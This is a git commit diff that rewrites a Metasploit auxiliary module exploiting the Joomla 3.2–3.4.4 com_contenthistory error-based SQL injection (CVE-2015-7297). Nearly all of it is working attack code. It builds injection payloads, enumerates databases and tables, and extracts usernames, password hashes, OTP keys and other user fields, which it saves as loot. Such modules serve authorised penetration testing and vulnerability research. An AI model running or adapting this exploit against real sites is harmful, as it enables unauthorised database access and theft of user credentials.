a6628110f6a703d9754eb0429a03abb9f7f82787
nixawk <hap.ddup@gmail.com>
2015-10-25 03:56:36 +0000

    rebuild joomla_contenthistory_sqli (cve-2015-7297)

--- modules/auxiliary/gather/joomla_contenthistory_sqli.rb
+++ modules/auxiliary/gather/joomla_contenthistory_sqli.rb
@@ -14,8 +14,9 @@ class Metasploit4 < Msf::Auxiliary
     super(update_info(info,
       'Name'           => 'Joomla com_contenthistory Error-Based SQL Injection',
       'Description'    => %q{
-      This module exploits a SQL injection vulnerability in Joomla versions 3.2 through 3.4.4
-      in order to either enumerate usernames and password hashes or session IDs.
+        This module exploits a SQL injection vulnerability in Joomla versions 3.2
+        through 3.4.4 in order to either enumerate usernames and password hashes
+        or session IDs.
       },
       'References'     =>
         [
@@ -24,101 +25,175 @@ class Metasploit4 < Msf::Auxiliary
         ],
       'Author'         =>
         [
-          'Asaf Orpani', #discovery
-          'bperry' #metasploit module
+          'Asaf Orpani', # discovery
+          'bperry', # metasploit module
+          'Nixawk' # module review
         ],
       'License'        => MSF_LICENSE,
-      'DisclosureDate' => "Oct 22 2015"
+      'DisclosureDate' => 'Oct 22 2015'
     ))
 
     register_options(
       [
-        OptString.new("TARGETURI", [true, 'The relative URI of the Joomla instance', '/'])
+        OptString.new('TARGETURI', [true, 'The relative URI of the Joomla instance', '/'])
       ], self.class)
   end
 
   def check
     flag = Rex::Text.rand_text_alpha(8)
-    left_marker = Rex::Text.rand_text_alpha(5)
-    right_marker = Rex::Text.rand_text_alpha(5)
+    lmark = Rex::Text.rand_text_alpha(5)
+    rmark = Rex::Text.rand_text_alpha(5)
 
-    payload = "AND (SELECT 8146 FROM(SELECT COUNT(*),CONCAT(0x#{left_marker.unpack("H*")[0]},(SELECT 0x#{flag.unpack("H*")[0]}),0x#{right_marker.unpack("H*")[0]},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)"
+    payload = 'AND (SELECT 8146 FROM(SELECT COUNT(*),CONCAT('
+    payload << "0x#{lmark.unpack('H*')[0]},"
+    payload << "(SELECT 0x#{flag.unpack('H*')[0]}),"
+    payload << "0x#{rmark.unpack('H*')[0]},"
+    payload << 'FLOOR(RAND(0)*2)'
+    payload << ')x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)'
 
     res = sqli(payload)
 
-    if res and res.body =~ /#{left_marker}#{flag}#{right_marker}/
-      return Msf::Exploit::CheckCode::Vulnerable
+    if res && res.code == 500 && res.body =~ /#{lmark}#{flag}#{rmark}/
+      Msf::Exploit::CheckCode::Vulnerable
     end
 
-    return Msf::Exploit::CheckCode::Safe
+    Msf::Exploit::CheckCode::Safe
+  end
+
+  def request(query)
+    query = "#{$payload}" % query
+    res = sqli(query)
+
+    # Error based SQL Injection
+    if res && res.code == 500 && res.body =~ /#{$lmark}(.*)#{$rmark}/
+      $1
+    end
+  end
+
+  def query_databases
+    dbs = []
+
+    query = '(SELECT IFNULL(CAST(COUNT(schema_name) AS CHAR),0x20) '
+    query << 'FROM INFORMATION_SCHEMA.SCHEMATA)'
+
+    dbc = request(query)
+
+    query_fmt = '(SELECT MID((IFNULL(CAST(schema_name AS CHAR),0x20)),1,54) '
+    query_fmt << 'FROM INFORMATION_SCHEMA.SCHEMATA LIMIT %d,1)'
+
+    0.upto(dbc.to_i - 1) do |i|
+      dbname = request(query_fmt % i)
+      dbs << dbname
+      print_good(dbname)
+    end
+
+    %w(performance_schema information_schema mysql).each do |dbname|
+      dbs.delete(dbname) if dbs.include?(dbname)
+    end
+    dbs
+  end
+
+  def query_tables(database)
+    tbs = []
+
+    query = '(SELECT IFNULL(CAST(COUNT(table_name) AS CHAR),0x20) '
+    query << 'FROM INFORMATION_SCHEMA.TABLES '
+    query << "WHERE table_schema IN (0x#{database.unpack('H*')[0]}))"
+
+    tbc = request(query)
+
+    query_fmt = '(SELECT MID((IFNULL(CAST(table_name AS CHAR),0x20)),1,54) '
+    query_fmt << 'FROM INFORMATION_SCHEMA.TABLES '
+    query_fmt << "WHERE table_schema IN (0x#{database.unpack('H*')[0]}) "
+    query_fmt << 'LIMIT %d,1)'
+
+    print_status('tables in database: %s' % database)
+    0.upto(tbc.to_i - 1) do |i|
+      tbname = request(query_fmt % i)
+      print_good(tbname)
+      tbs << tbname if tbname =~ /_users$/
+    end
+    tbs
+  end
+
+  def query_columns(database, table)
+    cols = []
+    query = "(SELECT IFNULL(CAST(COUNT(*) AS CHAR),0x20) FROM #{database}.#{table})"
+
+    colc = request(query)
+    print_status(colc)
+
+    valid_cols = [   # joomla_users
+      'activation',
+      'block',
+      'email',
+      'id',
+      'lastResetTime',
+      'lastvisitDate',
+      'name',
+      'otep',
+      'otpKey',
+      'params',
+      'password',
+      'registerDate',
+      'requireReset',
+      'resetCount',
+      'sendEmail',
+      'username'
+    ]
+
+    query_fmt = '(SELECT MID((IFNULL(CAST(%s AS CHAR),0x20)),%d,54) '
+    query_fmt << "FROM #{database}.#{table} ORDER BY id LIMIT %d,1)"
+
+    0.upto(colc.to_i - 1) do |i|
+      record = {}
+      valid_cols.each do |col|
+        l = 1
+        record[col] = ''
+        loop do
+          value = request(query_fmt % [col, l, i])
+          break if value.blank?
+          record[col] << value
+          l += 54
+        end
+      end
+      cols << record
+      print_status(record.to_s)
+    end
+    cols
   end
 
   def run
-    left_marker = Rex::Text.rand_text_alpha(5)
-    right_marker = Rex::Text.rand_text_alpha(5)
+    $lmark = Rex::Text.rand_text_alpha(5)
+    $rmark = Rex::Text.rand_text_alpha(5)
 
-    db_count = "AND (SELECT 6062 FROM(SELECT COUNT(*),CONCAT(0x#{left_marker.unpack("H*")[0]},(SELECT IFNULL(CAST(COUNT(schema_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),0x#{right_marker.unpack("H*")[0]},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)"
-    res = sqli(db_count)
-    db_count = $1.to_i || 0 if res and res.body =~ /#{left_marker}(.*)#{right_marker}/
+    $payload = ''
+    $payload << 'AND (SELECT 6062 FROM(SELECT COUNT(*),CONCAT('
+    $payload << "0x#{$lmark.unpack('H*')[0]},"
+    $payload << '%s,'
+    $payload << "0x#{$rmark.unpack('H*')[0]},"
+    $payload << 'FLOOR(RAND(0)*2)'
+    $payload << ')x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)'
 
-    dbs = []
-    0.upto(db_count-1) do |i|
-      db = "AND (SELECT 2255 FROM(SELECT COUNT(*),CONCAT(0x#{left_marker.unpack("H*")[0]},(SELECT MID((IFNULL(CAST(schema_name AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT #{i},1),0x#{right_marker.unpack("H*")[0]},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)"
-      res = sqli(db)
-      dbs << $1 if res and res.body =~ /#{left_marker}(.*)#{right_marker}/
-    end
-
-    dbs.delete('performance_schema')
-    dbs.delete('information_schema')
-    dbs.delete('mysql')
-
-    users = []
+    dbs = query_databases # query databases
     dbs.each do |db|
-      vprint_status("Found database: " + db)
-      tables = []
-      table_count = "AND (SELECT 8640 FROM(SELECT COUNT(*),CONCAT(0x#{left_marker.unpack("H*")[0]},(SELECT IFNULL(CAST(COUNT(table_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x#{db.unpack("H*")[0]})),0x#{right_marker.unpack("H*")[0]},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)"
-      res = sqli(table_count)
-      table_count = $1.to_i || 0 if res and res.body =~ /#{left_marker}(.*)#{right_marker}/
-
-      0.upto(table_count-1) do |i|
-        table = "AND (SELECT 2474 FROM(SELECT COUNT(*),CONCAT(0x#{left_marker.unpack("H*")[0]},(SELECT MID((IFNULL(CAST(table_name AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x#{db.unpack("H*")[0]}) LIMIT #{i},1),0x#{right_marker.unpack("H*")[0]},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)"
-        res = sqli(table)
-        table = $1 if res and res.body =~ /#{left_marker}(.*)#{right_marker}/
-        tables << table if table =~ /_users$/
-      end
-
+      tables = query_tables(db)             # query tables
       tables.each do |table|
-        vprint_status("Found table: " + table)
-        user_count = "AND (SELECT 3737 FROM(SELECT COUNT(*),CONCAT(0x#{left_marker.unpack("H*")[0]},(SELECT IFNULL(CAST(COUNT(*) AS CHAR),0x20) FROM #{db}.#{table}),0x#{right_marker.unpack("H*")[0]},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)"
-        res = sqli(user_count)
-        user_count = $1.to_i if res and res.body =~ /#{left_marker}(.*)#{right_marker}/
-        cols = ["activation","block","email","id","lastResetTime","lastvisitDate","name","otep","otpKey","params","password","registerDate","requireReset","resetCount","sendEmail","username"]
-
-        0.upto(user_count-1) do |i|
-          user = {}
-          cols.each do |col|
-            k = 1
-            val = nil
-            user[col] = ''
-            while val != ''
-              get_col = "AND (SELECT 7072 FROM(SELECT COUNT(*),CONCAT(0x#{left_marker.unpack("H*")[0]},(SELECT MID((IFNULL(CAST(#{col} AS CHAR),0x20)),#{k},54) FROM #{db}.#{table} ORDER BY id LIMIT #{i},1),0x#{right_marker.unpack("H*")[0]},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)"
-              res = sqli(get_col)
-              val = $1 if res and res.body =~ /#{left_marker}(.*)#{right_marker}/
-              user[col] << val
-              k = k + 54
-            end
-          end
-          users << user
-        end
+        cols = query_columns(db, table)     # query cokumns
+        next if cols.blank?
+        path = store_loot(
+          'joomla.users',
+          'text/plain',
+          datastore['RHOST'],
+          cols.to_json,
+          'joomla.users')
+        print_good('Saved file to: ' + path)
       end
     end
-
-    path = store_loot('joomla.file', 'text/plain', datastore['RHOST'], users.to_json, 'joomla.users')
-    print_good("Users saved to file: " + path)
   end
 
   def sqli(payload)
-    return send_request_cgi({
+    send_request_cgi({
       'uri' => normalize_uri(target_uri.path, 'index.php'),
       'vars_get' => {
         'option' => 'com_contenthistory',
@@ -126,7 +201,7 @@ class Metasploit4 < Msf::Auxiliary
         'list[ordering]' => '',
         'item_id' => 1,
         'type_id' => 1,
-        'list[select]' => "1 " + payload
+        'list[select]' => '1 ' + payload
       }
     })
   end
